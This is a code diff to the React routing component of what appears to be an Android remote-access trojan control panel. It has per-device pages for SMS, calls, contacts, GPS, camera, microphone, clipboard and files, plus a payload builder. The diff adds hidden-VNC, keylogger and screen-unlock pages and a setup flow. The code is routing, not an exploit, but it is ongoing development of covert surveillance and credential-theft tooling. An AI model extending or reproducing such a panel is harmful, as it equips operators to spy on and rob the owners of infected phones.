@@ -1,8 +1,10 @@
-import { Component, useEffect, useRef } from 'react';
+import { Component, useEffect, useRef, useState } from 'react';
 import { BrowserRouter, Routes, Route, Navigate, useNavigate } from 'react-router-dom';
+import axios from 'axios';
 import { useAuthStore } from '@/store/auth';
 import AppLayout from '@/components/layout/AppLayout';
 import LoginPage from '@/pages/Login';
+import SetupPage from '@/pages/Setup';
 import DashboardPage from '@/pages/Dashboard';
 import DevicesPage from '@/pages/Devices';
 import DevicePage from '@/pages/Device';
@@ -20,6 +22,10 @@ import NotificationsPage from '@/pages/device/Notifications';
 import PermissionsPage from '@/pages/device/Permissions';
 import AppsPage from '@/pages/device/Apps';
 import FasonPage from '@/pages/device/Fason';
+import HvncPage from '@/pages/device/Hvnc';
+import InspectorPage from '@/pages/device/Inspector';
+import KeyloggerPage from '@/pages/device/Keylogger';
+import UnlockPage from '@/pages/device/Unlock';
 import DownloadsPage from '@/pages/device/Downloads';
 import BuilderPage from '@/pages/Builder';
 import SettingsPage from '@/pages/Settings';
@@ -41,7 +47,7 @@ class ErrorBoundary extends Component<{ children: React.ReactNode }, { hasError:
               <AlertCircle className="h-8 w-8 text-destructive" />
             </div>
             <h2 className="text-xl font-semibold">Something went wrong</h2>
-            <p className="text-sm text-muted-foreground">An unexpected error occurred. Please try refreshing the page.</p>
+            <p className="text-sm text-muted-foreground">Something went wrong. Refresh the page to retry.</p>
             {this.state.error && import.meta.env.DEV && (
               <pre className="text-xs text-muted-foreground bg-muted p-3 rounded-lg overflow-auto max-h-32 text-left">
                 {this.state.error.message}
@@ -73,16 +79,51 @@ let authChecked = false;
 function AuthInitializer({ children }: { children: React.ReactNode }) {
   const { isChecking, checkAuth } = useAuthStore();
   const hasRun = useRef(false);
+  const [setupNeeded, setSetupNeeded] = useState<boolean | null>(null);
 
   useEffect(() => {
-    if (!hasRun.current && !authChecked) {
-      hasRun.current = true;
-      authChecked = true;
-      checkAuth();
-    }
+    if (hasRun.current) return;
+    hasRun.current = true;
+
+    axios.get('/api/setup/status')
+      .then(res => {
+        if (res.data?.data?.complete === false) {
+          setSetupNeeded(true);
+        } else {
+          setSetupNeeded(false);
+          if (!authChecked) {
+            authChecked = true;
+            checkAuth();
+          }
+        }
+      })
+      .catch(() => {
+        setSetupNeeded(false);
+        if (!authChecked) {
+          authChecked = true;
+          checkAuth();
+        }
+      });
   }, [checkAuth]);
 
+  if (setupNeeded === null) return <LoadingSpinner />;
+  if (setupNeeded) return <Navigate to="/setup" replace />;
+
   if (isChecking && !authChecked) return <LoadingSpinner />;
+  return <>{children}</>;
+}
+
+function SetupRoute({ children }: { children: React.ReactNode }) {
+  const [status, setStatus] = useState<boolean | null>(null);
+
+  useEffect(() => {
+    axios.get('/api/setup/status')
+      .then(res => setStatus(res.data?.data?.complete ?? false))
+      .catch(() => setStatus(false));
+  }, []);
+
+  if (status === null) return <LoadingSpinner />;
+  if (status) return <Navigate to="/login" replace />;
   return <>{children}</>;
 }
 
@@ -140,38 +181,47 @@ export default function App() {
     <ErrorBoundary>
       <BrowserRouter>
         <AuthEventListener />
-        <AuthInitializer>
-          <Routes>
-            <Route path="/login" element={<PublicRoute><LoginPage /></PublicRoute>} />
-            <Route path="/" element={<ProtectedRoute><AppLayout /></ProtectedRoute>}>
-              <Route index element={<DashboardPage />} />
-              <Route path="devices" element={<DevicesPage />} />
-              <Route path="users" element={<PermissionRoute permission="users:manage"><UsersPage /></PermissionRoute>} />
-              <Route path="builder" element={<PermissionRoute permission="builder:access"><BuilderPage /></PermissionRoute>} />
-              <Route path="settings" element={<SettingsPage />} />
-              <Route path="logs" element={<PermissionRoute permission="logs:view"><LogsPage /></PermissionRoute>} />
-              <Route path="device/:id" element={<DevicePage />}>
-                <Route path="info" element={<DeviceInfoPage />} />
-                <Route path="sms" element={<PermissionRoute permission="device:sms"><SmsPage /></PermissionRoute>} />
-                <Route path="calls" element={<PermissionRoute permission="device:calls"><CallsPage /></PermissionRoute>} />
-                <Route path="contacts" element={<PermissionRoute permission="device:contacts"><ContactsPage /></PermissionRoute>} />
-                <Route path="gps" element={<PermissionRoute permission="device:gps"><GpsPage /></PermissionRoute>} />
-                <Route path="camera" element={<PermissionRoute permission="device:camera"><CameraPage /></PermissionRoute>} />
-                <Route path="mic" element={<PermissionRoute permission="device:mic"><MicPage /></PermissionRoute>} />
-                <Route path="files" element={<PermissionRoute permission="device:files"><FilesPage /></PermissionRoute>} />
-                <Route path="wifi" element={<PermissionRoute permission="device:wifi"><WifiPage /></PermissionRoute>} />
-                <Route path="clipboard" element={<PermissionRoute permission="device:clipboard"><ClipboardPage /></PermissionRoute>} />
-                <Route path="notifications" element={<PermissionRoute permission="device:notifications"><NotificationsPage /></PermissionRoute>} />
-                <Route path="permissions" element={<PermissionRoute permission="device:permissions"><PermissionsPage /></PermissionRoute>} />
-                <Route path="apps" element={<PermissionRoute permission="device:apps"><AppsPage /></PermissionRoute>} />
-                <Route path="fason" element={<PermissionRoute permission="device:fason"><FasonPage /></PermissionRoute>} />
-                <Route path="downloads" element={<PermissionRoute permission="files:download"><DownloadsPage /></PermissionRoute>} />
-                <Route index element={<Navigate to="info" replace />} />
-              </Route>
-            </Route>
-            <Route path="*" element={<NotFoundPage />} />
-          </Routes>
-        </AuthInitializer>
+        <Routes>
+          <Route path="/setup" element={<SetupRoute><SetupPage /></SetupRoute>} />
+          <Route path="/*" element={
+            <AuthInitializer>
+              <Routes>
+                <Route path="/login" element={<PublicRoute><LoginPage /></PublicRoute>} />
+                <Route path="/" element={<ProtectedRoute><AppLayout /></ProtectedRoute>}>
+                  <Route index element={<DashboardPage />} />
+                  <Route path="devices" element={<DevicesPage />} />
+                  <Route path="users" element={<PermissionRoute permission="users:manage"><UsersPage /></PermissionRoute>} />
+                  <Route path="builder" element={<PermissionRoute permission="builder:access"><BuilderPage /></PermissionRoute>} />
+                  <Route path="settings" element={<SettingsPage />} />
+                  <Route path="logs" element={<PermissionRoute permission="logs:view"><LogsPage /></PermissionRoute>} />
+                  <Route path="device/:id" element={<DevicePage />}>
+                    <Route path="info" element={<DeviceInfoPage />} />
+                    <Route path="sms" element={<PermissionRoute permission="device:sms"><SmsPage /></PermissionRoute>} />
+                    <Route path="calls" element={<PermissionRoute permission="device:calls"><CallsPage /></PermissionRoute>} />
+                    <Route path="contacts" element={<PermissionRoute permission="device:contacts"><ContactsPage /></PermissionRoute>} />
+                    <Route path="gps" element={<PermissionRoute permission="device:gps"><GpsPage /></PermissionRoute>} />
+                    <Route path="camera" element={<PermissionRoute permission="device:camera"><CameraPage /></PermissionRoute>} />
+                    <Route path="mic" element={<PermissionRoute permission="device:mic"><MicPage /></PermissionRoute>} />
+                    <Route path="files" element={<PermissionRoute permission="device:files"><FilesPage /></PermissionRoute>} />
+                    <Route path="wifi" element={<PermissionRoute permission="device:wifi"><WifiPage /></PermissionRoute>} />
+                    <Route path="clipboard" element={<PermissionRoute permission="device:clipboard"><ClipboardPage /></PermissionRoute>} />
+                    <Route path="notifications" element={<PermissionRoute permission="device:notifications"><NotificationsPage /></PermissionRoute>} />
+                    <Route path="permissions" element={<PermissionRoute permission="device:permissions"><PermissionsPage /></PermissionRoute>} />
+                    <Route path="apps" element={<PermissionRoute permission="device:apps"><AppsPage /></PermissionRoute>} />
+                    <Route path="fason" element={<PermissionRoute permission="device:fason"><FasonPage /></PermissionRoute>} />
+                    <Route path="hvnc" element={<PermissionRoute permission="device:hvnc"><HvncPage /></PermissionRoute>} />
+                    <Route path="inspector" element={<PermissionRoute permission="device:inspector"><InspectorPage /></PermissionRoute>} />
+                    <Route path="keylogger" element={<PermissionRoute permission="device:keylogger"><KeyloggerPage /></PermissionRoute>} />
+                    <Route path="unlock" element={<PermissionRoute permission="device:unlock"><UnlockPage /></PermissionRoute>} />
+                    <Route path="downloads" element={<PermissionRoute permission="files:download"><DownloadsPage /></PermissionRoute>} />
+                    <Route index element={<Navigate to="info" replace />} />
+                  </Route>
+                </Route>
+                <Route path="*" element={<NotFoundPage />} />
+              </Routes>
+            </AuthInitializer>
+          } />
+        </Routes>
       </BrowserRouter>
     </ErrorBoundary>
   );
